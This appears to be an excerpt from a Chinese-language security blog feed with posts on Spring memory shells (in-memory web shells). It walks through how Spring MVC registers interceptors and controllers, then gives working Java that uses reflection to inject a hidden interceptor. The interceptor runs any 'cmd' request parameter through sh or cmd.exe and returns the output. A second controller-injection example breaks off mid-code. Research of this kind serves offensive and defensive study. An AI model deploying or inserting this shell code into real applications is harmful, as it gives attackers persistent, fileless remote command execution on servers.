org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 如果返回false, 整个请求到这里就结束, 不再执行后面的拦截器以及Controller的处理.</span></span><br><span class="line"><span class="comment">         * 如果返回true, 则继续执行后面的拦截器以及Controller的处理.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(<span class="string">&quot;MyInterceptor preHandle() called...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyInterceptor postHandle() called...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyInterceptor afterCompletion() called, which means the request and response is completed...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置类</span></span><br><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptorAppConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TestInterceptor testInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(testInterceptor).addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在TestInterceptorAppConfig#addInterceptors方法中下断点，观察堆栈信息，可以看到URL映射处理器RequestMappingHandlerMapping会调用setInterceptors方法将Spring IoC容器中所有的Interceptor保存到自己的interceptors属性中。</p><p><img src="/2024/05/19/Spring-Interceptor/1713495355735-e587e95f-dfe3-40f1-9253-9025bf0d9dcf.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-Interceptor/1713495391436-e4d814b9-84cc-444c-8e17-9385f31229c4.png" alt="image.png"></p><p>接着继续运行至Springboot启动完成，访问路由&#x2F;test&#x2F;index，发现会执行自定义的拦截器，当preHandle返回值为true时，会继续向下执行另外两个。</p><p><img src="/2024/05/19/Spring-Interceptor/1713496089513-30d06fcc-1407-472b-addd-677161e0ed95.png" alt="image.png"></p><p>观察堆栈信息，发现在执行了doDispatch#applyPreHandle方法之后，interceptorList中已经有自定义的拦截器了。</p><p><img src="/2024/05/19/Spring-Interceptor/1713496393644-196f3867-e478-43fe-8a88-939fb3dd8ad7.png" alt="image.png"></p><p>跟进一下doDispatch#applyPreHandle方法，发现会调用preHandle方法，因此，需要注册拦截的话一定是在这之前。</p><p><img src="/2024/05/19/Spring-Interceptor/1713496434093-87b53a34-9db0-4c09-83c1-b8d7d19e9144.png" alt="image.png"></p><p>观察一下注册流程，先调用checkMultipart方法判断request是否为文件上传请求，不是的话则会原样返回，接着调用getHandler方法，将getHandler方法执行后的结果返回给mappedHandler。</p><p><img src="/2024/05/19/Spring-Interceptor/1713496782074-ca71d527-7e61-46df-81dc-f74a6a0c64b3.png" alt="image.png"></p><p>跟进getHandler方法，会调用到org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler方法，接着会调用getHandlerExecutionChain方法。</p><p><img src="/2024/05/19/Spring-Interceptor/1713496847344-0ca7e300-87e8-42ad-b779-336bcef98de9.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-Interceptor/1713496976411-f31596d8-aa5b-44c2-8c68-98558f885c8e.png" alt="image.png"></p><p>跟进getHandlerExecutionChain方法，会遍历this.adaptedInterceptors对象里所有的HandlerInterceptor类实例，通过HandlerExecutionChain#addInterceptor方法把已有的所有拦截器加入到需要返回的HandlerExecutionChain exectuion属性中，完成注册。</p><p><img src="/2024/05/19/Spring-Interceptor/1713497069980-a6424c81-ca74-4e57-a843-449070978f6b.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-Interceptor/1713497365101-6e72d641-22d5-4b96-ace1-64adf5004df7.png" alt="image.png"></p><p>通过上文的分析，要注入Interceptor内存马，只要将Interceptor对象封装到MappedInterceptor对象中，然后将MappedInterceptor对象添加List集合adaptedInterceptors中即可。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>动态注册Spring Interceptor内存马的具体思路如下：</p><ul><li>获取Context</li><li>获取AbstractHandlerMapping</li><li>获取adaptedInterceptors属性</li><li>构造MappedInterceptor</li><li>调用adaptedInterceptors#add方法添加构造的mappedInterceptor对象</li></ul><h3 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a>动态注入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.MappedInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringInterceptorMemShell1</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/inject3&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SpringInterceptorMemShell1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            ArrayList&lt;HandlerInterceptor&gt; adaptedInterceptors = (ArrayList&lt;HandlerInterceptor&gt;)field.get(mappingHandlerMapping);</span><br><span class="line"></span><br><span class="line">            <span class="type">MappedInterceptor</span> <span class="variable">mappedInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MappedInterceptor</span>(<span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">InjectInterceptor</span>());</span><br><span class="line">            adaptedInterceptors.add(mappedInterceptor);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InjectInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/19/Spring-Interceptor/1713498183791-9fee0dc6-4fb9-4af0-950b-d525259928b5.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MemoryShell Of Controller</title>
      <link href="/2024/05/19/Spring-Controller/"/>
      <url>/2024/05/19/Spring-Controller/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring是一个开源容器框架，其核心就是控制反转（IOC）和面向切面（AOP）。Spring作为Java框架，核心组件为Core、Context和Bean，使用Spring的主要一个原因就是Spring会把对象之间的依赖关系转而用配置文件来管理，也就是依赖注入机制。</p><ul><li>Bean组件：Bean是Spring核心中的重点，Bean组件在Spring的org.springframework.beans包下，在这个包下的所有类主要解决了3件事，Bean的定义、创建及解析。</li><li>Context组件：Context又叫IOC容器，Context组件在Spring的org.springframework.context包下，给Spring提供一个运行时的环境，用于保存各个对象的状态。</li><li>Core组件：Core为处理对象间关系的方法，作为Spring的核心组件，其中包含了很多关键类，例如，定义资源的访问方式。</li></ul><p>SpringMVC是一种WEB层MVC框架，用于替代Servlet。在SpringMVC框架中，DispatcherServlet负责分发请求到控制器Controller进行处理，Controller则把用户的请求数据经过业务层处理后封装成一个ModelAndView对象，然后再把该对象返回给对应的View进行展示。在SpringMVC中定义一个Controller是非常简单的，不需要继承特定的类，也不需要实现相关接口，只需使用@Controller注解在一个类上进行标记即可。然后使用@RequestMapping等一些注解用定义URL请求和映射，这样Controller就能被访问。</p><p>而Spring内存马一般的构造方式就是模拟组件注册，从而来注入恶意组件，Spring Controller型内存马就是通过动态注册Controller来实现的。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>新建Spring项目，设置Server URL为<a href="https://start.aliyun.com/%E3%80%82">https://start.aliyun.com/。</a></p><p><img src="/2024/05/19/Spring-Controller/1713416564663-d25202a8-17fc-4749-8d26-7af92184bfbe.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello Contoller...&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><h3 id="注册Context"><a href="#注册Context" class="headerlink" title="注册Context"></a>注册Context</h3><p>在之前分析Tomcat型内存马和中间件型内存马时，要成功打入内存马，一个很重要的点就是先获取当前运行环境的上下文，在Spring应用中可以同时有多个Context，但其中只有一个Root Context，其余的均为Child Context，所有Child Context都可以访问在Root Context中定义的Bean，但是Root Context无法访问Child Context中定义的Bean，并且所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。</p><h4 id="Root-Context"><a href="#Root-Context" class="headerlink" title="Root Context"></a>Root Context</h4><ul><li>ContextLoader#getCurrentWebApplicationContext方法，Root Context是由ContextLoaderListener触发监听后ContextLoader所创建，因此，ContextLoader类中也相应的获取方法，即getCurrentWebApplicationContext方法。</li></ul><p><img src="/2024/05/19/Spring-Controller/1713419026876-d1d87036-a5e1-449d-8044-7c95bb9569a4.png" alt="image.png"></p><ul><li>WebApplicationContextUtils#getWebApplicationContext方法，由于所有的Context在创建后，都会被作为一个属性添加到了ServletContext中，因此，可以借助servletContext来获取Root Context。</li></ul><p><img src="/2024/05/19/Spring-Controller/1713418210868-7df74227-dcde-4880-9b0e-e3fb61197922.png" alt="image.png"></p><ul><li>ApplicationContext#getAttribute，ApplicationContext实现了ServletContext接口，getAttribute方法通过传入名称来获取上下文。</li></ul><p><img src="/2024/05/19/Spring-Controller/1713419338309-177e3657-8e6e-4a17-9d7a-5e1a9d7b7b1e.png" alt="image.png"></p><h4 id="Child-Context"><a href="#Child-Context" class="headerlink" title="Child Context"></a>Child Context</h4><ul><li>RequestContextUtils#getWebApplicationContext：，在request中存放着Child Context，因此可以借助request来获取Child Context，但是在较新Spring版本中已没有getWebApplicationContext方法。</li><li>Request#getAttribute，同样是借助request来获取Child Context，不过这里利用的是getAttribute方法。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Root WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Root WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext</span></span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="literal">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure><h3 id="注册Controller"><a href="#注册Controller" class="headerlink" title="注册Controller"></a>注册Controller</h3><ul><li>Spring 2.5开始到Spring 3.1之前一般使用org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping映射器</li><li>Spring 3.1开始及以后一般开始使用新的org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping映射器来支持@Contoller和@RequestMapping注解</li></ul><p>在org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping中存在方法registerMapping，其会调用父类的registerMapping方法，然后调用register方法完成注册。</p><p><img src="/2024/05/19/Spring-Controller/1713421598568-61c5ec79-cd86-445b-95fe-d590c2043894.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-Controller/1713421666603-5a9947d5-83c1-44ca-84ec-41f851ca7635.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-Controller/1713422496592-6e0479f9-abc0-4bfc-9191-cee742bd0a82.png" alt="image.png"></p><h3 id="注册流程"><a href="#注册流程" class="headerlink" title="注册流程"></a>注册流程</h3><p>在registerMapping方法中存在三个参数，分别为handler、method和mapping。</p><ul><li>handler：需要构造的controller对应的类</li><li>method：需要注册的controller中的方法</li><li>mapping：RequestMappingInfo类型的，设置Controller的一些请求参数的，若没有特殊要求全填null即可<br>java<br>&#x2F;&#x2F; handler<br>InjectToController injectToController &#x3D; new InjectToController();<br>&#x2F;&#x2F; method<br>Method method &#x3D; InjectToController.class.getMethod(“vuln”);<br>&#x2F;&#x2F; mapping<br>RequestMappingInfo info &#x3D; new RequestMappingInfo(null, null, null, null, null, null, null);</li></ul><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>动态注册Spring Controller内存马的具体思路如下：</p><ul><li>获取Context</li><li>获取RequestMappingHandlerMapping</li><li>获取MappingRegistry属性</li><li>构造RequestMappingInf</li><li>调用MappingRegistry#register方法注册Controller</li></ul><h3 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a>动态注入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 适用于Springboot &lt; 2.6.0环境, 从Springboot 2.6.0版本开始, 官方修改了url路径的默认匹配策略</span></span><br><span class="line"><span class="comment"> * 需要通过application.properties配置文件设置spring.mvc.pathmatch.matching-strategy的值为ant_path_matcher</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringControllerMemShell1</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/inject&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">TestController</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取上下文环境</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 